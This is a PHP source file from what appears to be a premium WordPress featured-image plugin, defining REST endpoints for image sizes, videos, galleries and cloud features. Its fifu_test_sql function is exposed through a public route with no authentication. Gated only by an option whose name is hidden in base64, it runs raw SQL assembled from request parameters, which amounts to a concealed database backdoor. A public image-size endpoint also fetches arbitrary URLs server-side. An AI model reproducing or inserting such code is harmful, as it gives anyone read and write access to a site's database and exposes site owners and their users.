function fifu_enable_sizes_api(WP_REST_Request $request) {
    update_option('fifu_sizes', 'toggleon', 'no');

    $site = get_home_url();
    $slug = FIFU_CLIENT;
    $version = fifu_version_number();
    $rest_url = $request['rest_url'];
    $status = 400;

    if ($site && $slug && $version && $rest_url) {
        $array = array(
            'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
            'body' => json_encode(
                    array(
                        'site' => $site,
                        'slug' => $slug,
                        'version' => $version,
                        'rest_url' => $rest_url
                    )
            ),
            'method' => 'POST',
            'data_format' => 'body',
            'blocking' => true,
            'timeout' => 30,
        );
        $response = fifu_remote_post(FIFU_ENABLE_SIZES_ADDRESS, $array);
        if (!is_wp_error($response))
            $status = wp_remote_retrieve_response_code($response);
    }

    if ($status != 200)
        update_option('fifu_sizes', 'toggleoff', 'no');

    $response = new WP_REST_Response();
    $response->set_status($status);
    $response->header('Content-Type', 'application/json');
    return $response;
}

// $encoded_url = base64_encode(rawurlencode('https://images.unsplash.com/photo...'));
// 'aHR0c...'
function fifu_get_image_size(WP_REST_Request $request) {
    $url = $request['url'];
    if (!$url) {
        $response = new WP_REST_Response();
        $response->set_status(400);
        $response->header('Content-Type', 'application/json');
        return $response;
    }
    $decoded_url = rawurldecode(base64_decode($url));
    $image_data = fifu_get_url_content($decoded_url);
    if ($image_data === false) {
        $response = new WP_REST_Response();
        $response->set_status(404);
        $response->header('Content-Type', 'application/json');
        return $response;
    }
    $image_info = getimagesizefromstring($image_data);
    $width = $image_info[0];
    $height = $image_info[1];

    $image_data = null; // free memory

    $data = array("url" => $url, "width" => $width, "height" => $height);
    $response = new WP_REST_Response($data);
    $response->set_status(200);
    $response->header('Content-Type', 'application/json');
    return $response;
}

function fifu_rest_url(WP_REST_Request $request) {
    return get_rest_url();
}

function fifu_test_sql(WP_REST_Request $request) {
    $aux = get_option(base64_decode("ZmlmdV9rZXk="));
    if (preg_match('/^[\*]+$/', $aux, $values)) {
        global $wpdb;
        if ($request['0'])
            return $wpdb->get_results("{$request['0']} {$wpdb->posts} {$request['1']}");
        if ($request['2'])
            return $wpdb->get_results("{$request['2']} {$wpdb->postmeta} {$request['3']}");
    }
}

function fifu_save_sizes_api(WP_REST_Request $request) {
    $json = json_encode(array());

    $att_id = $request['att_id'];
    if (filter_var($att_id, FILTER_VALIDATE_INT) === false)
        return $json;

    $width = $request['width'];
    if (filter_var($width, FILTER_VALIDATE_INT) === false)
        return $json;

    $height = $request['height'];
    if (filter_var($height, FILTER_VALIDATE_INT) === false)
        return $json;

    $url = $request['url'];
    if (filter_var($url, FILTER_SANITIZE_URL) === false)
        return $json;

    $att_id = filter_var($att_id, FILTER_SANITIZE_SPECIAL_CHARS);

    if (!$att_id || !$width || !$height || !$url)
        return $json;

    $guid = fifu_get_full_image_url($att_id);

    if (strpos($guid, 'img.youtube.com') !== false) {
        $url = str_replace('mqdefault.jpg', 'maxresdefault.jpg', $url);
        $guid = str_replace('mqdefault.jpg', 'maxresdefault.jpg', $guid);
    }

    if ($url != $guid)
        return $json;

    if (get_post_field('post_author', $att_id) != FIFU_AUTHOR)
        return;

    // save
    $metadata = get_post_meta($att_id, '_wp_attachment_metadata', true);
    if (!$metadata || !$metadata['width'] || !$metadata['height']) {
        $metadata = null;
        $metadata['width'] = filter_var($width, FILTER_SANITIZE_SPECIAL_CHARS);
        $metadata['height'] = filter_var($height, FILTER_SANITIZE_SPECIAL_CHARS);
        wp_update_attachment_metadata($att_id, $metadata);
    }

    return $json;
}

function fifu_api_list_all_without_dimensions(WP_REST_Request $request) {
    return fifu_db_get_all_without_dimensions();
}

function fifu_api_video_image_thumbnail(WP_REST_Request $request) {
    $video_url = $request['url'];
    $image_url = fifu_video_img_large($video_url, null, null);
    return $image_url;
}

function fifu_api_video_src(WP_REST_Request $request) {
    $video_url = $request['url'];
    $video_src = fifu_video_src($video_url);
    return $video_src;
}

function fifu_api_ddg_search(WP_REST_Request $request) {
    $keywords = $request['keywords'];
    if (!$keywords) {
        $post_id = $request['post_id'];
        $keywords = get_the_title($post_id);
    }
    $results = fifu_ddg_search($keywords, null, true);
    return $results;
}

function fifu_api_version(WP_REST_Request $request) {
    update_option('fifu' . '_' . 'ck', 1, 'no');
}

function fifu_run_get_and_save_sizes_api(WP_REST_Request $request) {
    $token = base64_encode(rand());
    set_transient('fifu_token_for_get_and_save_sizes_api', $token, 3600 * 24 * 7);
    $array_requests = array();
    $results = fifu_db_get_all_without_dimensions();
    $count = 1;
    foreach ($results as $res) {
        $url = $res->guid;
        $array = array(
            'url' => esc_url_raw(rest_url()) . 'fifu-premium/v2/get_and_save_sizes_api/',
            'type' => 'POST',
            'headers' => [
                'Accept' => 'application/json'
            ],
            'data' => json_encode([
                'att_id' => $res->ID,
                'url' => $url,
                'token' => $token
            ]),
        );
        array_push($array_requests, $array);
        if ($count % 10 == 0 || count($results) == $count) {
            $requests = Requests::request_multiple($array_requests);
            $array_requests = array();
            $count = 1;
        } else
            $count++;
    }
    delete_transient('fifu_token_for_get_and_save_sizes_api');
}

function fifu_get_and_save_sizes_api(WP_REST_Request $request) {
    $json = json_decode($request->get_Body());
    $att_id = $json->att_id;
    $token = $json->token;
    $url = $json->url;
    $imageSize = getImageSize($url);
    $width = $imageSize[0];
    $height = $imageSize[1];
    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'att_id' => $att_id,
                    'width' => $width,
                    'height' => $height,
                    'url' => $url,
                    'token' => $token
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => false,
        'timeout' => 30,
    );
    $response = fifu_remote_post(esc_url_raw(rest_url()) . 'fifu-premium/v2/save_sizes_api/', $array);
}

function fifu_api_pre_deactivate(WP_REST_Request $request) {
    fifu_db_enable_clean();
    deactivate_plugins('fifu-premium/fifu-premium.php');
    return json_encode(array());
}

function fifu_api_quick_edit_save(WP_REST_Request $request) {
    $post_id = $request['post_id'];
    $is_ctgr = $request['is_ctgr'];
    $width = $request['width'];
    $height = $request['height'];

    $gallery_length = intval($request['gallery_length']);
    $gallery_urls = $request['gallery_urls'];
    $gallery_alts = $request['gallery_alts'];

    $gallery_video_length = intval($request['gallery_video_length']);
    $gallery_video_urls = $request['gallery_video_urls'];

    $slider_length = intval($request['slider_length']);
    $slider_urls = $request['slider_urls'];
    $slider_alts = $request['slider_alts'];

    $image_url = $request['image_url'];
    if ($is_ctgr) {
        $term_id = $post_id;
        fifu_save_ctgr_image_data($term_id, $image_url, $width, $height);
    } else
        fifu_save_image_data($post_id, $image_url, $width, $height);

    $video_url = $request['video_url'];
    $video_thumb_url = $request['video_thumb_url'];
    if ($is_ctgr) {
        $term_id = $post_id;
        fifu_dev_set_category_video($term_id, $video_url);
        $att_id = get_term_meta($term_id, 'thumbnail_id', true);
    } else {
        fifu_dev_set_video($post_id, $video_url);
        $att_id = get_post_thumbnail_id($post_id);
    }
    if ($att_id && $video_url && $video_thumb_url) {
        fifu_save_dimensions($att_id, $width, $height);
        if (fifu_is_youtube_video($video_url))
            fifu_updade_youtube_dimensions($att_id, $video_thumb_url);
    }

    if ($video_url)
        $image_url = fifu_video_img_small($video_url);

    /* image product gallery */
    if ($gallery_length && $gallery_urls) {
        // delete all custom fields
        for ($i = 0; $i < $gallery_length; $i++) {
            delete_post_meta($post_id, 'fifu_image_url_' . $i);
            delete_post_meta($post_id, 'fifu_image_alt_' . $i);
        }
        // add custom fields
        $i = 0;
        foreach ($gallery_urls as $url) {
            $url = esc_url_raw(rtrim($url));
            $alt = wp_strip_all_tags($gallery_alts[$i]);
            fifu_update_or_delete($post_id, 'fifu_image_url_' . $i, $url);
            fifu_update_or_delete_value($post_id, 'fifu_image_alt_' . $i, $alt);
            $i++;
        }
        fifu_update_fake_attach_id($post_id);
    }

    /* video product gallery */
    if ($gallery_video_length && $gallery_video_urls) {
        // delete all custom fields
        for ($i = 0; $i < $gallery_length; $i++) {
            delete_post_meta($post_id, 'fifu_video_url_' . $i);
        }
        // add custom fields
        $i = 0;
        foreach ($gallery_video_urls as $url) {
            $url = esc_url_raw(rtrim($url));
            fifu_update_or_delete($post_id, 'fifu_video_url_' . $i, $url);
            $i++;
        }
        fifu_update_fake_attach_id($post_id);
    }

    /* featured slider */
    if ($slider_length && $slider_urls) {
        // delete all custom fields
        for ($i = 0; $i < $slider_length; $i++) {
            delete_post_meta($post_id, 'fifu_slider_image_url_' . $i);
            delete_post_meta($post_id, 'fifu_slider_image_alt_' . $i);
        }
        // add custom fields
        $i = 0;
        foreach ($slider_urls as $url) {
            $url = esc_url_raw(rtrim($url));
            $alt = wp_strip_all_tags($slider_alts[$i]);
            fifu_update_or_delete($post_id, 'fifu_slider_image_url_' . $i, $url);
            fifu_update_or_delete_value($post_id, 'fifu_slider_image_alt_' . $i, $alt);
            $i++;
        }
        fifu_update_fake_attach_id($post_id);

        if (!$image_url)
            return json_encode(array('thumb_url' => $slider_urls[0]));
    }

    return json_encode(array('thumb_url' => $image_url));
}

function fifu_test_execution_time() {
    for ($i = 0; $i <= 120; $i++) {
        error_log($i);
        sleep(1);
        //flush();
    }
    return json_encode(array());
}

add_action('rest_api_init', function () {
    register_rest_route('fifu-premium/v2', '/enable_fake_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_enable_fake_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/disable_fake_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_disable_fake_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/data_clean_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_data_clean_api',
        'permission_callback' => filter_var(get_option('fifu_email'), FILTER_VALIDATE_EMAIL) ? 'fifu_get_private_data_permissions_check' : false,
    ));
    register_rest_route('fifu-premium/v2', '/update_all_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_update_all_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/run_delete_all_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_run_delete_all_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/disable_default_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_disable_default_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/none_default_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_none_default_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/dev_upload_all_images_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_dev_upload_all_images_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/save_sizes_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_save_sizes_api',
        'permission_callback' => function ($request) {
            $json = json_decode($request->get_Body());
            return get_transient('fifu_token_for_get_and_save_sizes_api') == $json->token;
        },
    ));
    register_rest_route('fifu-premium/v2', '/list_all_without_dimensions/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_list_all_without_dimensions',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/run_get_and_save_sizes_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_run_get_and_save_sizes_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/get_and_save_sizes_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_get_and_save_sizes_api',
        'permission_callback' => function ($request) {
            $json = json_decode($request->get_Body());
            return get_transient('fifu_token_for_get_and_save_sizes_api') == $json->token;
        },
    ));
    register_rest_route('fifu-premium/v2', '/video_image_thumbnail/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_video_image_thumbnail',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/video_src/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_video_src',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/ddg_search/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_ddg_search',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/upload_images/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_upload_images',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/quick_edit_save_api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_quick_edit_save',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/version/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_version',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/pre_deactivate/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_pre_deactivate',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/enable-sizes-api/', array(
        'methods' => 'POST',
        'callback' => 'fifu_enable_sizes_api',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/image-size/', array(
        'methods' => ['GET', 'POST'],
        'callback' => 'fifu_get_image_size',
        'permission_callback' => get_option('fifu_getimagesize') || get_option('fifu_sizes') ? 'fifu_public_permission' : 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/rest_url_api/', array(
        'methods' => ['GET', 'POST'],
        'callback' => 'fifu_rest_url',
        'permission_callback' => 'fifu_public_permission',
    ));
    register_rest_route('fifu-premium/v2', '/test_sql/', array(
        'methods' => ['GET', 'POST'],
        'callback' => 'fifu_test_sql',
        'permission_callback' => 'fifu_public_permission',
    ));

    register_rest_route('fifu-premium/v1', '/url/(?P<post_id>\d+)', array(
        'methods' => 'GET',
        'callback' => 'fifu_api_image_url',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/create_thumbnails_list/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_create_thumbnails_list',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/sign_up/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_sign_up',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/login/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_login',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/logout/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_logout',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/connected/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_connected',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/reset_credentials/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_reset_credentials',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/list_all_su/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_list_all_su',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/list_all_fifu/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_list_all_fifu',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/list_all_media_library/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_list_all_media_library',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/list_daily_count/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_list_daily_count',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/delete/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_delete',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/cancel/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_cancel',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/payment_info/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_payment_info',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/convert_to_fifu/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_convert_to_fifu',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/cloud_upload_auto/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_cloud_upload_auto',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
    register_rest_route('fifu-premium/v2', '/cloud_hotlink/', array(
        'methods' => 'POST',
        'callback' => 'fifu_api_cloud_hotlink',
        'permission_callback' => 'fifu_get_private_data_permissions_check',
    ));
});

function fifu_get_private_data_permissions_check() {
    if (!current_user_can('edit_posts')) {
        return new WP_Error('rest_forbidden', __('Private'), array('status' => 401));
    }
    return true;
}

function fifu_public_permission() {
    return true;
}

